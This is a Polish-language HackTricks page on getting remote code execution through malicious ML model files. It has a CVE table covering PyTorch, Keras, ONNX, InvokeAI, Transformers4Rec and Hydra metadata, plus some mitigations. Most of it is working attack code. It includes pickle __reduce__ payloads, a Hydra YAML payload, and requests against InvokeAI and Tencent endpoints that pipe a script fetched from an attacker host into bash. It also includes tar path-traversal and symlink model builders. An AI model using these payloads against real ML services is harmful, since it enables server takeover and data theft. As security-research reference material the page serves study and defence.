# RCE modeli

{{#include ../banners/hacktricks-training.md}}

## Ładowanie modeli do RCE

Modele uczenia maszynowego są zwykle udostępniane w różnych formatach, takich jak ONNX, TensorFlow, PyTorch itp. Te modele mogą być ładowane na maszyny deweloperów lub do systemów produkcyjnych w celu użycia. Zazwyczaj modele nie powinny zawierać złośliwego kodu, ale zdarzają się przypadki, w których model może zostać użyty do wykonania dowolnego kodu na systemie — jako zamierzona funkcja lub z powodu podatności w bibliotece ładującej model.

W momencie pisania oto kilka przykładów tego typu podatności:

| **Framework / Narzędzie**  | **Podatność (CVE jeśli dostępne)**                                                                 | **Wektor RCE**                                                                                                                           | **Referencje**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Niezabezpieczona deserializacja w* `torch.load` **(CVE-2025-32434)**                                                              | Złośliwy pickle w checkpoint modelu prowadzi do wykonania kodu (obejście zabezpieczenia `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + złośliwe pobranie modelu powoduje wykonanie kodu; RCE przez Java deserializację w API zarządzania                                        | |
| **NVIDIA Merlin Transformers4Rec** | Niezabezpieczona deserializacja checkpointu przez `torch.load` **(CVE-2025-23298)**                                           | Nieufny checkpoint wywołuje pickle reducer podczas `load_model_trainer_states_from_checkpoint` → wykonanie kodu w workerze ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (niebezpieczne YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Ładowanie modelu z YAML używa `yaml.unsafe_load` (wykonanie kodu) <br> Ładowanie modelu z warstwą **Lambda** uruchamia dowolny kod Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Specjalnie spreparowany `.tflite` model wywołuje overflow całkowitoliczbowy → corrupt pamięci sterty (potencjalne RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Ładowanie modelu przez `joblib.load` wykonuje pickle z payloadem atakującego (`__reduce__`)                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *sporne*                                                                              | Domyślne `numpy.load` pozwala na wczytywanie picklowanych tablic obiektów – złośliwe `.npy/.npz` wyzwalają wykonanie kodu                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Zewnętrzna ścieżka wag w modelu ONNX może uciec z katalogu (odczyt dowolnych plików) <br> Złośliwy tar modelu ONNX może nadpisać dowolne pliki (prowadząc do RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model z niestandardowym operatorem wymaga załadowania natywnego kodu atakującego; złożone grafy modelu mogą nadużywać logiki do wykonania niezamierzonych obliczeń   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Użycie API ładowania modeli z włączonym `--model-control` pozwala na względne path traversal do zapisu plików (np. nadpisanie `.bashrc` dla RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (wiele heap overflow)                                                                         | Uszkodzony plik modelu GGUF powoduje przepełnienia bufora na stercie w parserze, umożliwiając wykonanie dowolnego kodu na systemie ofiary                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Złośliwy HDF5 (`.h5`) model z warstwą Lambda nadal wykonuje kod przy ładowaniu (Keras safe_mode nie obejmuje starego formatu – „downgrade attack”) | |
| **Others** (general)        | *Błąd projektowy* – Pickle serialization                                                                                         | Wiele narzędzi ML (np. formaty oparte na pickle, `pickle.load` w Pythonie) wykona dowolny kod osadzony w plikach modelu, jeśli nie zastosowano mitigacji | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Niezaufane metadane przekazane do `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadane/config modelu kontrolowane przez atakującego ustawiają `_target_` na dowolny callable (np. `builtins.exec`) → wykonywane podczas ładowania, nawet dla „bezpiecznych” formatów (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ponadto istnieją modele oparte na pythonowym pickle, takie jak te używane przez [PyTorch](https://github.com/pytorch/pytorch/security), które mogą posłużyć do wykonania dowolnego kodu na systemie, jeśli nie są ładowane z `weights_only=True`. Zatem każdy model oparty na pickle może być szczególnie podatny na tego typu ataki, nawet jeśli nie jest wymieniony w powyższej tabeli.

### Hydra metadata → RCE (działa nawet z safetensors)

`hydra.utils.instantiate()` importuje i wywołuje dowolny punktowany `_target_` w obiekcie konfiguracji/metadanych. Gdy biblioteki przekazują **niezaufane metadane modelu** do `instantiate()`, atakujący może dostarczyć callable i argumenty, które uruchomią się natychmiast podczas ładowania modelu (bez potrzeby użycia pickle).

Przykład ładunku (działa w `.nemo` `model_config.yaml`, repo `config.json`, lub `__metadata__` wewnątrz `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Kluczowe punkty:
- Wyzwalane przed inicjalizacją modelu w NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders oraz FlexTok loaders.
- Mechanizm blokowania ciągów w Hydra można obejść poprzez alternatywne ścieżki importu (np. `enum.bltns.eval`) lub nazwy rozwiązywane przez aplikację (np. `nemo.core.classes.common.os.system` → `posix`).
- FlexTok także parsuje metadane zapisane jako string przy użyciu `ast.literal_eval`, co umożliwia DoS (wybuch użycia CPU/pamięci) przed wywołaniem Hydra.

### 🆕  InvokeAI RCE przez `torch.load` (CVE-2024-12029)

`InvokeAI` to popularny otwartoźródłowy interfejs webowy dla Stable-Diffusion. Wersje **5.3.1 – 5.4.2** udostępniają REST endpoint `/api/v2/models/install`, który pozwala użytkownikom pobierać i ładować modele z dowolnych adresów URL.

Wewnątrz endpoint ostatecznie wywołuje:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Gdy dostarczony plik jest **PyTorch checkpoint (`*.ckpt`)**, `torch.load` wykonuje **pickle deserialization**. Ponieważ zawartość pochodzi bezpośrednio z URL kontrolowanego przez użytkownika, atakujący może osadzić złośliwy obiekt z niestandardową metodą `__reduce__` wewnątrz checkpointu; metoda ta jest wykonywana **during deserialization**, prowadząc do **remote code execution (RCE)** na serwerze InvokeAI.

Luka otrzymała identyfikator **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Utwórz złośliwy checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hostuj `payload.ckpt` na serwerze HTTP, którym kontrolujesz (np. `http://ATTACKER/payload.ckpt`).
3. Wywołaj podatny endpoint (nie wymaga uwierzytelnienia):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Gdy InvokeAI pobiera plik, wywołuje `torch.load()` → gadżet `os.system` uruchamia się i atakujący uzyskuje wykonanie kodu w kontekście procesu InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatyzuje cały proces.

#### Warunki

•  InvokeAI 5.3.1-5.4.2 (flaga scan domyślnie **false**)  
•  `/api/v2/models/install` dostępny dla atakującego  
•  Proces ma uprawnienia do wykonywania poleceń shell

#### Środki zaradcze

* Zaktualizuj do **InvokeAI ≥ 5.4.3** – poprawka ustawia `scan=True` domyślnie i wykonuje skanowanie pod kątem malware przed deserializacją.  
* Podczas programowego ładowania checkpointów używaj `torch.load(file, weights_only=True)` lub nowego helpera [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Wymuszaj allow-lists / signatures dla źródeł modeli i uruchamiaj usługę z zasadą najmniejszych uprawnień.

> ⚠️ Pamiętaj, że **każdy** format oparty na Python pickle (w tym wiele `.pt`, `.pkl`, `.ckpt`, `.pth` files) jest z natury niebezpieczny do deserializacji ze źródeł niegodnych zaufania.

---

Przykład doraźnego środka zaradczego, jeśli musisz utrzymać starsze wersje InvokeAI działające za reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE przez niebezpieczne `torch.load` (CVE-2025-23298)

Transformers4Rec firmy NVIDIA (część Merlin) ujawnił niebezpieczny loader checkpointów, który bezpośrednio wywoływał `torch.load()` na ścieżkach dostarczonych przez użytkownika. Ponieważ `torch.load` polega na Python `pickle`, checkpoint kontrolowany przez atakującego może wykonać dowolny kod za pomocą reducera podczas deserializacji.

Wrażliwa ścieżka (przed poprawką): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Dlaczego to prowadzi do RCE: W Python `pickle` obiekt może zdefiniować reducer (`__reduce__`/`__setstate__`), który zwraca wywoływalny obiekt i argumenty. Wywoływalny obiekt jest uruchamiany podczas unpicklingu. Jeśli taki obiekt znajduje się w checkpointcie, wykonuje się on zanim zostaną użyte jakiekolwiek wagi.

Minimalny przykład złośliwego checkpointu:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Wektory dostarczenia i zasięg szkód:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zastąpił bezpośrednie `torch.load()` ograniczonym, z listy dozwolonych deserializatorem zaimplementowanym w `transformers4rec/utils/serialization.py`. Nowy loader weryfikuje typy/pola i uniemożliwia wywoływanie dowolnych callable podczas ładowania.

Wytyczne obronne specyficzne dla PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Przykład – tworzenie złośliwego modelu PyTorch

- Utwórz model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Załaduj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent FaceDetection-DSFD udostępnia endpoint `resnet`, który deserializes dane kontrolowane przez użytkownika. ZDI potwierdziło, że zdalny atakujący może zmusić ofiarę do załadowania złośliwej strony/pliku, spowodować, by wysłała przygotowany serialized blob do tego endpointu, i wywołać deserialization jako `root`, prowadząc do pełnego przejęcia.

Przebieg exploita odzwierciedla typowe pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Każdy gadget osiągalny podczas deserialization (constructors, `__setstate__`, framework callbacks, itd.) można uzbroić w ten sam sposób, niezależnie od tego, czy transport był HTTP, WebSocket, czy plikiem upuszczonym do monitorowanego katalogu.


## Modele do Path Traversal

Jak wspomniano w [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), większość formatów modeli używanych przez różne frameworki AI opiera się na archiwach, zwykle `.zip`. W związku z tym możliwe jest nadużycie tych formatów w celu przeprowadzenia ataków path traversal, pozwalając na odczyt dowolnych plików z systemu, w którym model jest ładowany.

Na przykład, za pomocą poniższego kodu możesz stworzyć model, który utworzy plik w katalogu `/tmp` podczas ładowania:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Alternatywnie, używając poniższego kodu możesz utworzyć model, który po załadowaniu utworzy symlink do katalogu `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Dogłębna analiza: deserializacja .keras i gadget hunting

Aby uzyskać szczegółowy przewodnik po wewnętrznych mechanizmach .keras, Lambda-layer RCE, problemie arbitrary import w ≤ 3.8 oraz odkrywaniu gadgetów po poprawce wewnątrz allowlist, zobacz:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Źródła

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
